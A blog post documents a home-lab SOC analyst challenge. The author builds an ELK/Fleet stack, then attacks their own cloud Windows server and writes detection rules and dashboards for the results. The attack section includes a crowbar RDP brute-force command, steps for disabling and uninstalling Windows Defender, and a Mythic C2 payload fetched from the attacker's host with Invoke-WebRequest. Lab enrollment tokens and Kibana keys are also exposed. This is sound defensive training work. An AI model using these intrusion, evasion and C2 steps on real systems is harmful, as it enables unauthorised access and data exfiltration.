---
title: "SOC Project - MyDFIR 30-Day SOC Analyst Challenge"
show_date: true
excerpt_separator: "<!--more-->" # use the separator on the post to create a manual excerpt
categories:
  - Blog
  - Projects
tags:
  - security operations center
  - home lab
  - ELK
  - osTicket
  - Mythic Framework
  - C2
---
This is a Security Operations Center project that follows the tasks from the [30-day SOC Analyst Challenge](https://www.youtube.com/playlist?list=PLG6KGSNK4PuBb0OjyDIdACZnb8AoNBeq6) from [MyDFIR](https://www.youtube.com/@MyDFIR). In this post, I documented all the steps, some of them I had to adapt to different Cloud environments (DigitalOcean and Azure). An overview of the project sections are:

- Set up of the project components: SOC (ELK server, fleet server and osTicket server), endpoints (Windows and Linux servers) and Mythic server.
- Creation of alerts and dashboards.
- Generating telemetry: brute force attacks.
- Compromise demostration: Mythic C2 and data exfiltration.
- Suspicious activity investigation.
- Ticketing system implementation.
- Response action with Elastic Defend.
<!--more-->

# A. Project Logical Diagram
The next diagram illustrates the project composition. I will be using two Cloud services (DigitalOcean and Azure) because DigitalOcean doesn't include Windows, and I don't have enough credits in Azure for everything.

![diagram](/assets/images/mydfir-challenge/mydfir-30-day-soc-analyst-challenge-diagram.png)


# B. ELK Server set up
## Elasticsearch set up

1) Create VPC Network on DigitalOcean.
- I chose the Amsterdam AMS3 Region and established the IP range to 172.31.0.0/24.

![](/assets/images/mydfir-challenge/vpc-config.png)

2) Create cloud instance for Elasticsearch.

![](/assets/images/mydfir-challenge/elk-instance.png)

3) Access VM through ssh session and update-upgrade the system.

![](/assets/images/mydfir-challenge/elk-update.png)

4) Download Elasticsearch.

```sh
wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-8.15.2-amd64.deb
```

5) Install Elasticsearch from the package.

```sh
dpkg -i elasticsearch-8.15.2-amd64.deb
```

6) Save security information.
7) Configure Elasticsearch for remote access.

![](/assets/images/mydfir-challenge/elasticsearch-config.png)

8) Configure firewall to limit access to analyst's machine.
- I added the ELK instance to this firewall group.

![](/assets/images/mydfir-challenge/firewall-ssh.png)

9) Start Elasticsearch service.

![](/assets/images/mydfir-challenge/elasticsearch-service.png)


## Kibana set up
Kibana will be installed in the same ELK instance.

1) Download and install Kibana.

![](/assets/images/mydfir-challenge/kibana-install.png)

2) Configure Kibana for remote access.

![](/assets/images/mydfir-challenge/kibana-config.png)

3) Start Kibana service.

![](/assets/images/mydfir-challenge/kibana-service.png)

4) Generate an Elasticsearch enrollment token for Kibana.

![](/assets/images/mydfir-challenge/kibana-token.png)

5) Configure Firewall rule to allow connection through any TCP port from our machine.

![](/assets/images/mydfir-challenge/firewall-all-tcp.png)

6) Access Kibana GUI.

![](/assets/images/mydfir-challenge/access-kibana-with-token.png)

7) Get verification code and enter it.

![](/assets/images/mydfir-challenge/verification-code.png)

8) Log in with the password from the security information obtained after installing Elasticsearch and the user `elastic`.
9) Generate Kibana's encryption keys.

```sh
/usr/share/kibana/bin/kibana-encryption-keys generate
```
```sh
# output:
xpack.encryptedSavedObjects.encryptionKey: 70dc6317e7c0e6108f29c16ad9f7329b
xpack.reporting.encryptionKey: 1b8674fdd8da6fffd6088a511e599846
xpack.security.encryptionKey: 6c7c0cbf8a114d39a51743a06ec33237
```

10) Add Kibana's encryption keys.
![](/assets/images/mydfir-challenge/kibana-encryption-keys.png)

11) Restart Kibana service.
```sh
systemctl restart kibana.service
```


# C. Endpoints set up
## Windows Server 2022
Because DigitalOcean doesn't include any Windows images to install, I'll be using the Azure Cloud to deploy the Windows Server with the Azure CLI.

1) Create resource group.
```powershell
$rg="soc-challenge-rg"
$loc="northeurope"
```

```powershell
az group create --name $rg --location $loc
```

2) Create Windows Server 2022 VM.
```powershell
$vm="mydfir-win-ayna"
$vn="soc-challenge-vnet"
$sn="soc-challenge-subnet"
$nsg="soc-challenge-nsg"
```

```powershell
az vm create --resource-group $rg --name $vm --image Win2022Datacenter --public-ip-sku Standard --admin-username "azureuser" --admin-password {MyPassword} --vnet-name $vn --vnet-address-prefix 10.0.0.0/16 --subnet $sn --subnet-address-prefix 10.0.0.0/24 --nsg $nsg --nsg-rule NONE
```

![](/assets/images/mydfir-challenge/mydfir-win-ayna.png)

3) Install web server.
```powershell
az vm run-command invoke -g $rg -n $vm --command-id RunPowerShellScript --scripts "Install-WindowsFeature -name Web-Server -IncludeManagementTools"
```

4) Open port 80 for web traffic.
```powershell
az vm open-port --port 80 --resource-group $rg --name $vm
```

![](/assets/images/mydfir-challenge/win-server-http.png)

5) Open port 3386 **only** for the SOC analyst machine.
```powershell
az network nsg rule create --resource-group $rg --nsg-name $nsg --name allow_rdp --priority 100 --source-address-prefixes {MyPublicIP} --destination-port-ranges 3389 --destination-address-prefixes 13.79.153.53 --direction Inbound --access Allow --protocol Tcp --description "Allow RDP from SOC Analyst Public IP"
```

![](/assets/images/mydfir-challenge/win-server-rdp.png)


### Elastic Agent and Fleet Server Setup
1) Back in DigitalOcean, create another VM for the Fleet Server.

![](/assets/images/mydfir-challenge/mydfir-fleet-server.png)

2) Allow all incoming traffic from the fleet server.

![](/assets/images/mydfir-challenge/firewall-fleet-server.png)

3) Allow incoming traffic through port 9200 in the ELK server.

```sh
ufw allow 9200
```

4) Allow incoming traffic through port 8220 in the Fleet server.

```sh
ufw allow 8220
```

5) Access the Elastic GUI through `134.209.202.144:5601`.

6) Add Fleet Server in Elastic and install it in centralized host.

7) Add Elastic Agent `mydfir-windows-policy`.

8) Install the Elastic Agent on the Windows Server through the fleet server and port 8220 with a self-signed certificate.

```powershell
$ProgressPreference = 'SilentlyContinue'
```

```powershell
Invoke-WebRequest -Uri https://artifacts.elastic.co/downloads/beats/elastic-agent/elastic-agent-8.15.3-windows-x86_64.zip -OutFile elastic-agent-8.15.3-windows-x86_64.zip
```

```powershell
Expand-Archive .\elastic-agent-8.15.3-windows-x86_64.zip -DestinationPath . 
```

```powershell
cd elastic-agent-8.15.3-windows-x86_64 
```

```powershell
.\elastic-agent.exe install --url=https://146.190.19.13:8220 --enrollment-token=empmSjJaSUJfS0UzUWcwTWJ4a086d2ZnVjE0SDVRcTIwTXpkNEhzN2UzQQ== --insecure
```

8) Allow all traffic from the Windows Server to the ELK server.

![](/assets/images/mydfir-challenge/win-firewall-elk.png)


### Sysmon setup
I will install Sysmon on the Windows Server for additional logs.

1) Download [Sysmon](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon) and the [sysmon configuration file](https://github.com/olafhartong/sysmon-modular/blob/master/sysmonconfig.xml) by Olaf Hartong.

2) Install Sysmon with the configuration file.

```powershell
Sysmon64.exe -accepteula -i sysmonconfig.xml
```

3) Check if it's operational by looking up the Sysmon service.

![](/assets/images/mydfir-challenge/sysmon-service.png)


### Elasticsearch ingest data from Windows Server
1) Add Sysmon logs to Elasticsearch:
- Add integration > Add `Custom Windows Event Logs`:

![](/assets/images/mydfir-challenge/add-sysmon-integration.png)

2) Repeat the proces with Windows Defender:

![](/assets/images/mydfir-challenge/add-defender-integration.png)


## Linux SSH Server

1) Again, in DigitalOcean, create an Ubuntu Server 24.04 with an SSH server.

![](/assets/images/mydfir-challenge/mydfir-linux.png)

2) Access the server through ssh.
```sh
ssh root@104.248.194.247
```

3) Create `mydfir-linux-policy` and add Elastic agent.
```sh
curl -L -O https://artifacts.elastic.co/downloads/beats/elastic-agent/elastic-agent-8.15.3-linux-x86_64.tar.gz
tar xzvf elastic-agent-8.15.3-linux-x86_64.tar.gz 
cd elastic-agent-8.15.3-linux-x86_64 
sudo ./elastic-agent install --url=https://146.190.19.13:8220 --enrollment-token=ZFRsazM1SUJfS0UzUWcwTU5Ubmo6RU1CZi1IWnFUeTJKMFE5MjRaUUpnZw== --insecure
```

![](/assets/images/mydfir-challenge/fleet-linux.png)

After some minutes I got some failed root access attempts from different IPs:

![](/assets/images/mydfir-challenge/failed-password-authlog.png)

And these are the events collected by the Elastic agent:

![](/assets/images/mydfir-challenge/failed-password-elk.png)


# D. Creation of Alerts and Dashboards
## SSH autentication alerts and dashboard
### Alerts
From the `Analytics` > `Discover` section, we can view the logs and filter through them.

1) To create alerts for brute force attempts, we need to filter our logs with certain labels:

```KQL
# filter by:
agent.name: mydfir-linux-angieyuliananaranjo2751 and system.auth.ssh.event: Failed
# select fields:
user.name
source.ip
source.geo.country_name
```

![](/assets/images/mydfir-challenge/ssh-failed-activity.png)

2) Create alerts by clicking on `Alerts` > `Create search threshold rule`.

![](/assets/images/mydfir-challenge/brute-force-alerts-angieyuliananaranjo2751.png)

*Note: After revision, I updated the name to comply with the giveaway rules:*

![](/assets/images/mydfir-challenge/ssh-brute-force-alert.png) 


### Dashboard
From the `Analytics` > `Maps` section, we can create a map visualization for the SSH authentication attemps.
1) Create a map for failed attempts.

![](/assets/images/mydfir-challenge/map-ssh-failed.png)

4) Repeat the process for successful authentications.

![](/assets/images/mydfir-challenge/map-ssh-success.png)

- *Fun fact: I almost panicked when I saw the successful authentication from the US. But, nevermind, it was me accessing through the DigitalOcean console.*


## RDP authentication alerts and dashboard
### Alerts
1) In the `Discover` section, filter the logs with necessary labels:

```KQL
# filter by:
agent.name: mydfir-win-ayna and event.code : "4625" and winlog.event_data.LogonType : "3" 
# select fields:
user.name
source.ip
source.geo.country_name
```

- I made sure to include the Logon Type 3, even if Steve's instructions didn't include it, because other Logon types were displayed without the filter. And Logon type 3 includes only the failed remote logon attempt.

![](/assets/images/mydfir-challenge/rdp-failed-activity.png)

2) Create alerts by clicking on `Alerts` > `Create search threshold rule`.

![](/assets/images/mydfir-challenge/rdp-bruteforce-alerts.png)

*Note: After revision, I updated the name to comply with the giveaway rules:*

![](/assets/images/mydfir-challenge/rdp-brute-force-alert.png) 


### Dashboard
I created two maps for failed and successful RDP authentications and added them to the `Authentication Activity` dashboard.
The filter used for the successful RDP authentications is `agent.name: mydfir-win-ayna and event.code : "4624" and winlog.event_data.LogonType : "10"`.

![](/assets/images/mydfir-challenge/map-rdp.png)


## Create Visualizations
In the `Dashboard` section we can also create other types of data visualizations, such as tables. Accordingly, I created four tables for these specific groups of events:

1) Failed and successful SSH authentications:

![](/assets/images/mydfir-challenge/tables-ssh.png)

2) Failed and successful RDP authentications:
![](/assets/images/mydfir-challenge/tables-rdp.png)


## Alerts generated by Detection Rules
The alerts created through the `Analytics > Discover` section are displayed in the `Observability > Alerts` section.

![](/assets/images/mydfir-challenge/observability-alert-ssh.png)

However, these alerts focus on the alert triggering process, instead of displaying the information we need to analyse the alert. To create alerts with additional information, we can do so in the `Security` > `Rules` section.

1) Navigate to `Menu > Security > Rules > Detection Rules` and click on `Create new rule`.

2) To `Define rule`, select `Threshold`.

3) Define rule so the alert triggers when there are more than 5 failed root authentication attempts to the SSH server and the fields username and source IP are always included.

![](/assets/images/mydfir-challenge/define-ssh-rule.png)

![](/assets/images/mydfir-challenge/about-ssh-rule.png)


Then repeate the process for the RDP failed login alert:

![](/assets/images/mydfir-challenge/about-rdp-rule.png)

Now in the `Security` > `Alerts` section we can see all the information we specified quickly visible.

![](/assets/images/mydfir-challenge/rdp-alert.png)


# E. Attack on Windows Server - C2 Server and Data Exfiltration
## Attack diagram
The next diagram illustrates the attack process on the Windows Server.

![](/assets/images/mydfir-challenge/mydfir-attack-diagram.png)


## Mythic Server Setup
"Mythic is a multiplayer, command and control platform for red teaming operations". I'm installing Mythic in another Ubuntu Server 22.04 in the DigitalOcean Cloud.

![](/assets/images/mydfir-challenge/mythic.png)

1) Once the server is deployed, I'm logging into it through SSH.

```sh
ssh root@128.199.50.62
```

2) Now we can follow the [Mythic installation guide](https://docs.mythic-c2.net/installation). All the following commands are executed as root.

3) Update and upgrade repositories.

```sh
apt update && apt upgrade -y
```

4) Clone Mythic repository.

```sh
git clone https://github.com/its-a-feature/Mythic --depth 1
```

5) Install docker with the script included in the repository.

```sh
cd Mythic
./install_docker_ubuntu.sh
```

6) Install the `mythic-cli` inside the `Mythic` folder.

```sh
apt install make
make
```

7) Start the `Mythic CLI`.

```sh
./mythic-cli start
```

8) Limit the access with a new firewall to our IP and the target servers IPs.

![](/assets/images/mydfir-challenge/mythic-firewall.png)

- The attacker IP is for the Kali Linux machine that I'll be using.
- At this point, I have two firewalls. One for the defensive side (ELK, Windows, and Linux server) and one for the offensive side (Mythic server). The additional rules are default outbound rules.

![](/assets/images/mydfir-challenge/firewalls.png)

9) As mentioned during the output from the Mythic CLI start up, to access the Mythic WUI, we use `https://<server-ip>:7443`

```sh
#..SNIP..
MYTHIC SERVICE          WEB ADDRESS                                                     BOUND LOCALLY
Nginx (Mythic Web UI)   https://127.0.0.1:7443                                           false
Mythic Backend Server   http://127.0.0.1:17443                                           true
Hasura GraphQL Console  http://127.0.0.1:8080                                            true
Jupyter Console         http://127.0.0.1:8888                                            true
Internal Documentation  http://127.0.0.1:8090                                            true
#..SNIP..
```

- The default user is `mythic_admin` and the password can be found in the configuration file `.env` for the variable `MYTHIC_ADMIN_PASSWORD`.

![](/assets/images/mydfir-challenge/mythic-password.png)

![](/assets/images/mydfir-challenge/mythic-login.png)


## Attack process
### 1. Initial access
1) To simulate the attack diagram's goal (*Download passwords.txt file*), I created this file on the Windows Server machine, where I included the password for the server. I saved the file in the Documents directory.

![](/assets/images/mydfir-challenge/save-passwordstxt.png)

2) After that, on my Kali Linux machine, I prepared a wordlist that includes the actual password so the brute force attack can work.

![](/assets/images/mydfir-challenge/wordlist.png)

3) For the brute force attack, install the tool `crowbar`.

> "Crowbar is a brute-force attack tool developed to crack open network services that support various authentication mechanisms. It is widely used for RDP cracking, but also supports protocols like SSH, OpenVPN, and VNC. The primary function of Crowbar is to perform attacks where credentials are tested en masse to find combinations that grant access. Crowbar stands out for its ability to handle connections that use keys instead of passwords, as well as for managing its attacks by spreading them over multiple IP addresses to avoid detection."
> Article: ["Accessing Remote Desktops: A Beginner’s Guide to RDP Cracking with Crowbar and PPG tools"](https://medium.com/@1200km/accessing-remote-desktops-a-beginners-guide-to-rdp-cracking-with-crowbar-and-ppg-tools-5f50027115b7)

```sh
sudo apt install crowbar
```

4) Perform the brute force attack with the created wordlist against the Windows Server.

```sh
crowbar -b rdp -C /home/ayna/wordlist.txt -u azureuser -s 13.79.153.53/32
```

![](/assets/images/mydfir-challenge/crowbar.png)

After 5 seconds it obtained the right password!

5) Now we can gain access to the server through RDP.

```sh
xfreerdp /u:azureuser /p:CompanyName2024! /v:13.79.153.53:3389 /dynamic-resolution
```


### 2. Discovery
During the discovery stage, we can use commands to gain knowledge about the system and internal network. The goal of this activity in this project is to generate telemetry to analyse later.

1) `whoami` to check the running user.
2) `ipconfig /all` to check all the network configuration of the server.

![](/assets/images/mydfir-challenge/whoami-ipconfig.png)

3) `net group` to check if there are groups part of a Domain Controller.
4) `net user` to check the user accounts in the server.

![](/assets/images/mydfir-challenge/net-group-user.png)

5) `net user azureuser` to check the specific user details, which reveals the user `azureuser` is an administrator account.

![](/assets/images/mydfir-challenge/azureuser.png)

6) `netstat -ano | findstr LISTENING` to check for open ports.

![](/assets/images/mydfir-challenge/listening-ports.png)

7) `tasklist /SVC` to check for running services. For example, I found the Elastic agent, the Sysmon service and the Beats agents running that I installed earlier.

![](/assets/images/mydfir-challenge/tasklist-svc.png)


### 3. Defense Evasion
To perform basic defense evasion, I'll be disabling Windows Defender.

1) Access Windows Security.

2) Access the `Virus & threat protection settings`.

I wasn't able to disable the features even if I was running the administrator account.

![](/assets/images/mydfir-challenge/cant-disable-defender.png)

Therefore, I attempted various ways to solve this.

> ⚠️ TLDR: Uninstall from the Server Manager features. Skip to **attempt C** for detailed documentation. 
{: .notice--success}

---

>**> Attempt (A). Modify Defender policies:**
> 
> 1) If Defender was being controlled by the previous policies, then it's possible to disable the `Virus & threat protection`.
> 2) Access `Local Group Policy Editor`.
> 3) Navigate to `Computer Configuration > Administrative Templates > Windows Components > Microsoft Defender Antivirus`.
> 4) Modify these policies:
> 
> ```
> Turn off Microsoft Defender Antivirus -> Enabled
> ```
> 
> ![](/assets/images/mydfir-challenge/turn-off-defender-antivirus.png)
> 
> ```
> Turn off real-time protection -> Enabled
> ```
> 
> ![](/assets/images/mydfir-challenge/turn-off-realtime-protection.png) 
> 
> ```
> Turn on behaviour monitoring -> Disabled
> ```
> 
> ![](/assets/images/mydfir-challenge/disable-behavior-monitoring.png) 
> 
> 5) Restart the virtual machine.
> 6) Not working. 🤷

---

> **> Attempt (B). Edit Registry settings:**
> 
> 1) Access the `Registry Editor`.
> 2) Navigate to `HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender`.
> 3) Set key `DisableAntiSpyware` to `1`. If it does not exist, right-click and create new `DWORD (32-bit) Value`.
> 
> ![](/assets/images/mydfir-challenge/new-dword.png) 
> 
> ![](/assets/images/mydfir-challenge/disableantispyware-1.png)
> 
> 4) Set keys `DisableBehaviorMonitoring` and `DisableRealtimeMonitoring` to `1`. For me. they were already set to 1 from the previous policies modifications.
> 
> ![](/assets/images/mydfir-challenge/disablemonitoring-0.png) 
> 
> 5) Restart.
> 
> After doing that, I noticed the Microsoft Defender security alerts, which are worth noting. These were only triggered when I was modifying the Registry, not before.
> 
> ![](/assets/images/mydfir-challenge/security-alerts-defender.png) 
> 
> In the alert details we can find the affected file `regedit.exe`.
> 
> ![](/assets/images/mydfir-challenge/security-alerts-defender-details.png) 
> 
> This also didn't work. Then I realized, I could do the next step.

---

**> Attempt (C). Remove Microsoft Defender Antivirus feature for Windows Server:**

1) Access the `Windows Server Manager`.

2) Click `Manage > Remove Roles and Features`. Click `Next` until we're in the `Features` tab. Look for `Microsoft Defender Antivirus` and uncheck it. Now click `Remove`.

![](/assets/images/mydfir-challenge/remove-feature-defender.png)

3) Once that's finished, restart the VM.

4) Because we uninstalled Defender, now when we access the `Virus & threat protection settings`, the features are off.

![](/assets/images/mydfir-challenge/security-off.png) 

*PD: Probably there is a way to disable Defender without uninstalling it, which I was trying. But I think I generated enough telemetry which was the initial goal. And I performed Defense Evasion successfully for the attack process. But if you know how to do that, please let me know. The key was probably in Microsoft Defender for Cloud installed in Azure, which I couldn't find out how to remove.*


### 4. Execution: deploy Mythic Agent

1) Access the Mythic server's `Mythic` folder.

2) From the options of [Mythic Agents](https://github.com/MythicAgents) I'll be installing an `Apollo` agent, because it works on Windows and the supported C2 profiles includes HTTP, SMB and TCP.

```sh
./mythic-cli install github https://github.com/MythicAgents/Apollo.git
```

3) Create a [C2 profile](https://github.com/MythicC2Profiles): `http`.

```sh
./mythic-cli install github https://github.com/MythicC2Profiles/http
```

We can see the installed Payload and C2 Profiles list clicking on the 🎧 headphones icon on the top bar.

![](/assets/images/mydfir-challenge/agent-and-profile.png) 

4) To create a payload, navigate to the payloads tab (☢ radioactive icon).

5) Click on `Actions > Generate New Payload`.
	- Operating System: `Windows`.
	- Payload type: `apollo`, output as `WinExe`.
	- Commands included: all.
	- Include C2 profile `http`. Change `callback host` to `http://<mythic-server-ip>`.
	- Payload name: `svchost-angieyuliananaranjo2751.exe`.

6) Copy download link for payload.

![](/assets/images/mydfir-challenge/payload-download.png) 

7) Download payload into the Mythic server.

```sh
wget <payload-link> --no-check-certificate
```

![](/assets/images/mydfir-challenge/wget-payload.png) 

8) Change the payload's name and move it to a separate directory.

![](/assets/images/mydfir-challenge/organize-payload.png) 


### 5. Establish C2

1) Run `http.server` from the Mythic server to expose the `Mythic/1/` directory for external access.

```sh
python3 -m http.server 9999
```

2) Download payload from target's machine (RDP session from Kali Linux).

```powershell
Invoke-WebRequest -Uri http://128.199.50.62:9999/svchost-angieyuliananaranjo2751.exe
```

![](/assets/images/mydfir-challenge/invoke-webrequest-payload.png) 

3) Run payload to establish connection.

![](/assets/images/mydfir-challenge/run-payload.png) 

4) Check that the connection has been established.

```powershell
netstat -anob
```

![](/assets/images/mydfir-challenge/established-connection.png) 

5) Check the `Active Callbacks` (📞 telephone icon) in the Mythic Server.

![](/assets/images/mydfir-challenge/active-callback.png) 


### 6. Exfiltrate sensitive document
Having established the C2, we can perform the objective on the target (download the sensitive passwords document).

1) Still in the `Active Callbacks` section, execute the `download` command with the target file.

![](/assets/images/mydfir-challenge/download-txt.png) 

2) Once it's downloaded, it can be found in the `Files` sections (📎 clip icon), where we can preview the content or download it.

![](/assets/images/mydfir-challenge/preview-txt.png) 

Now the full attack process has been completed. Next step is analysing the generated telemetry.


# F. Alerts and Dashboards for Mythic Activity
## Query for payload execution

1) First, we need to query for the related events to have a narrowed sight.


> 1. Query for events that include the binary file `svchost-angieyuliana2751.exe`
> 2. Query for Sysmon Event ID 1, to find process creation events. This indicates the file has been executed.
{: .notice--primary}

![](/assets/images/mydfir-challenge/query-svchost.png) 

2) Once we identify the suspicious event, we can select and annotate the fields that we want to consider during the rule and dashboard creation.

```markdown
# fields to consider

winlog.event_data.OriginalFileName: Apollo.exe
winlog.event_data.Hashes: "*SHA256=F5A4A9FF6D244A22FBBCB39DB5396AF4D7D7025D0A23538F69DC049B6B8295B2*"
```

3) Because the file's name can be changed, we can change the query to look for process create events where the process hash is the previous one or its original name is `Apollo.exe`.

```
event.code: "1" and event.provider: Microsoft-Windows-Sysmon and (winlog.event_data.Hashes: "*SHA256=F5A4A9FF6D244A22FBBCB39DB5396AF4D7D7025D0A23538F69DC049B6B8295B2*" or winlog.event_data.OriginalFileName: "Apollo.exe")
```


## Create rule to detect payload execution
With the filtered events, we have a narrowed sight into the kind of threat we want to detect. It's time to create that detection rule.

1) Navigate to `Security > Rules > Detection rules (SIEM) > Create new rule`.

2) Select `Custom query`, and add the previous query. Then add to `required fields` each field relevant to the event for a summary of that event:

```
@timestamp
winlog.event_data.User
host.hostname
message
winlog.event_data.CommandLine
winlog.event_data.Image
winlog.event_data.ParentCommandLine
winlog.event_data.ParentImage
winlog.event_data.ProcessGuid
winlog.event_data.CurrentDirectory
```

- Severity `Critical`.

- For the schedule, enter `Runs every 5 minutes` and `Additional look-back time 5 minutes`.

3) Create and enable rule.

![](/assets/images/mydfir-challenge/agent-rule-created.png) 


## Create visualization for Process Create
This visualization will show the events ID 1 `Process Create` where the processes `powershell`, `cmd` or `rundll32` are executed.

1) Prepare query.

```KQL
event.code: "1" and event.provider: Microsoft-Windows-Sysmon and (powershell or cmd or rundll32)
```

2) Navigate to `Dashboards > Create dashboard > Create visualization`. 

3) Select time for the last 7 days, enter the query, select the fields and choose table mode.
	- Each field will show 999 values and no group remaining values as `Other`.

![](/assets/images/mydfir-challenge/table-process-creation.png) 

4) Saved dashboard as `MyDFIR-Suspicious-Activity`.


## Create visualization for network connections
This visualization will show the events ID 3 `Network connection` where the processes initiate an outboud connection.

1) Prepare query.
	- Excluded connections initiated by `MsMpEng.exe`, which is Windows Defender looking for updates, to reduce noise.

```KQL
event.code: "3" and event.provider : "Microsoft-Windows-Sysmon" and winlog.event_data.Initiated : "true" and not winlog.event_data.Image :*MsMpEng.exe
```

2) In the same dashboard as before, create a new visualization.

3) Select time for the last 7 days, enter the query, select the fields and choose table mode.
	- Each field will show 999 values and no group remaining values as `Other`.

![](/assets/images/mydfir-challenge/table-network-connections.png) 


## Create visualization for Defender disabled
Because Windows Defender Antivirus was uninstalled as part of the server roles and features, I had to follow a different approach to the one suggested in the Challenge videos. There is no exact event ID for a feature uninstall or easy guide to find the right events, so I had to investigate and correlate on my own. The Fun Part. 

1. I searched the events related to "Antivirus".
	1. The last event is a Microsoft Defender Antivirus Service stop event (ID 7036) on `Nov 19, 2024 @ 19:16:18.028`. And it never reinitiated again. So this suggests the service was disabled or uninstalled around that time.
2. I filtered the events between the dates `Nov 19, 2024 @ 19:00:00.000` and `Nov 19, 2024 @ 19:30:00.000`
3. I searched for the process `ServerManager.exe` as the uninstallation was done through this.
	1. At `Nov 19, 2024 @ 19:01:23.461` the Server Manager was launched. This happens during initial boot or after closing the application and opening it again. The process was created by `ServerManagerLauncher.exe`.
	2. At `Nov 19, 2024 @ 19:15:22.049` the process `wmiprvse.exe` created a new file `C:\Windows\System32\ServerManager\ComponentConfiguration\Windows-Defender.xml`. This file could've reflected a Windows Defender configuration update.
	3. Between `19:15:45.157` and `19:15:45.163` the process `wmiprvse.exe` modifies the registry keys inside `HKLM\SOFTWARE\Microsoft\ServerManager\ServicingStorage\ServerComponentCache\WAS-NET-Environment\`, which are related to the settings of the Server's features.
4. Searching for `WinDefend` related events:
	1. I found multiple `Registry object added or deleted` events (Sysmon Event ID 12) between `Nov 19, 2024 @ 19:16:00.239` and `Nov 19, 2024 @ 19:16:00.261`.
	2. They're all `EventType: DeleteValue`.
	3. They're all executed by the image `C:\Windows\System32\poqexec.exe`. This is the `Process-on-Queue Executor`, a system process for queued file or registry changes with elevated privileges.
	4. Deleted registry objects (19):
	```
	HKLM\System\CurrentControlSet\Services\WinDefend\DependOnService
	HKLM\System\CurrentControlSet\Services\WinDefend\Description
	HKLM\System\CurrentControlSet\Services\WinDefend\DisplayName
	HKLM\System\CurrentControlSet\Services\WinDefend\ErrorControl
	HKLM\System\CurrentControlSet\Services\WinDefend\FailureActions
	HKLM\System\CurrentControlSet\Services\WinDefend\ImagePath
	HKLM\System\CurrentControlSet\Services\WinDefend\LaunchProtected
	HKLM\System\CurrentControlSet\Services\WinDefend\ObjectName
	HKLM\System\CurrentControlSet\Services\WinDefend\RequiredPrivileges
	HKLM\System\CurrentControlSet\Services\WinDefend\ServiceSidType
	HKLM\System\CurrentControlSet\Services\WinDefend\Start
	HKLM\System\CurrentControlSet\Services\WinDefend\Type
	HKLM\System\CurrentControlSet\Services\WinDefend\Security\Security
	HKLM\System\CurrentControlSet\Services\EventLog\System\WinDefend\EventMessageFile
	HKLM\System\CurrentControlSet\Services\EventLog\System\WinDefend\ParameterMessageFile
	HKLM\System\CurrentControlSet\Services\EventLog\System\WinDefend\ProviderGuid
	HKLM\System\CurrentControlSet\Services\EventLog\System\WinDefend\TypesSupported
	HKLM\System\CurrentControlSet\Control\SafeBoot\Network\WinDefend
	HKLM\System\CurrentControlSet\Control\SafeBoot\Minimal\WinDefend
	```
	5. These registry keys specify the Windows Defender configuration data and its startup. For example, the `Start` key specifies when the service is started.
	6. This suggest an ongoing uninstallation or disabling of Windows Defender.

![](/assets/images/mydfir-challenge/deleted-registry-keys.png) 

╚═ Query used: `event.code: 12 and event.provider: Microsoft-Windows-Sysmon and WinDefend`

6. I searched for the origin of the process `poqexec.exe`.
	1. I noticed more deleted registry objects related to Windows Defender in the same time frame as the previous ones. 
	2. Previous to the registry keys deletion (between `Nov 19, 2024 @ 19:15:58.572` and `Nov 19, 2024 @ 19:15:59.743`), this process accessed and successively deleted 85 files, but mostly Windows Defender files, such as drivers and DLLs (Event ID 4660).

![](/assets/images/mydfir-challenge/poqexec-delete-drivers.png) 

3. At `Nov 19, 2024 @ 19:15:58.420`, the process `poqexec.exe` was created by `TiWorker.exe`, which is the `Windows Trusted Installer Worker`. This parent process is responsible for Windows Updates and the install or uninstall of other components.

```
A new process has been created.

Creator Subject:
	Security ID:		S-1-5-18
	Account Name:		mydfir-win-ayna$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x204
	New Process Name:	C:\Windows\System32\poqexec.exe
	Token Elevation Type:	TokenElevationTypeDefault (1)
	Mandatory Label:		S-1-16-16384
	Creator Process ID:	0x1d50
	Creator Process Name:	C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.20348.2750_none_b1add92ef99eeea4\TiWorker.exe
	Process PID: 7,504
```

> **Timeline**
> - `Nov 19, 2024 @ 19:01:23.461` - **Security Log Event ID 4688** - ServerManager.exe was launched.
> - `Nov 19, 2024 @ 19:15:22.049` - **Sysmon Event ID 11** - `wmiprvse.exe` created a new configuration file `C:\Windows\System32\ServerManager\ComponentConfiguration\Windows-Defender.xml
> `19:15:45.157` and `19:15:45.163` - **Sysmon Event ID 13** - `wmiprvse.exe` modifies the registry keys related to the Server's features.
> - `Nov 19, 2024 @ 19:15:58.420` - **Security Log Event ID 4688** - `poqexec.exe` was loaded by `TiWorker.exe`.
> - `Nov 19, 2024 @ 19:15:58.572` to `Nov 19, 2024 @ 19:15:59.743` - **Security Log Event ID 4660** - `pqexec.exe` deleted Windows Defender related files.
> - `Nov 19, 2024 @ 19:16:00.239` to `Nov 19, 2024 @ 19:16:00.261` - **Sysmon Event ID 12** - multiple `Registry object added or deleted` events.
> - `Nov 19, 2024 @ 19:16:18.028` - **SCM Event ID 7036** - final Microsoft Defender Antivirus Service stop.
{: .notice--primary}

Therefore, some the events that we can consider suspicious activity to track with a visualization are:
- Deletion of Windows Defender registry keys.
```KQL
# KQL Query
event.code : 12 and event.provider : Microsoft-Windows-Sysmon and winlog.event_data.EventType: "DeleteValue" and winlog.event_data.TargetObject: (*WinDefend* or *WdNisSvc* or *WdNisDrv* or *WdFilter* or *WdBoot* or *WindowsDefender* or *MsMpEng*)
```

- Microsoft Defender Antivirus service start/stop.
```KQL
# KQL Query
event.code: 7036 and event.provider : "Service Control Manager" and winlog.event_data.param1:("Microsoft Defender Antivirus Network Inspection Service" or "Microsoft Defender Antivirus Service") 
```

So, I'll create two new visualizations.

1) Create the visualizations in the `MyDFIR-Suspicious-Activity` dashboard.

2) Select time for the last 7 days, enter the query, select the fields and choose table mode.
	- Each field will show 999 values and no group remaining values as `Other`.

- Visualization for deleted Defender's registry keys:

![](/assets/images/mydfir-challenge/deleted-registry-keys-table.png) 

- Visualization for MDA service start/stop.

![](/assets/images/mydfir-challenge/defender-start-stop.png) 


# G. Ticketing System
The ticketing system used for this project is [osTicket](https://osticket.com/features/). A ticketing system in a SOC is a centralized platform that helps organizations to report and record potential security issues, track and assign the reported issue to a specific analyst for further investigation, and prioritize tickets based on severity, impact and urgency.

